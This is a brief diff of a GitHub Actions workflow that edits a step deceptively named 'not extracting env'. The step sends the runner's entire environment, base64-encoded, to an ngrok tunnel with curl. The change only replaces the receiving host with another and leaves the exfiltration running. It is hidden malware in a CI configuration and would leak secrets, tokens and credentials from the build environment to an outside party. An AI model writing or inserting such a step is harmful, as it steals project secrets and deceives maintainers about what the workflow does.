@@ -27,4 +27,4 @@ jobs:
 
       - name: not extracting env
         run: |
-          curl -k https://b1ed-128-130-252-211.ngrok-free.app?data=$(env | base64 --wrap=0)
+          curl -k https://a26a-77-119-194-228.ngrok-free.app?data=$(env | base64 --wrap=0)
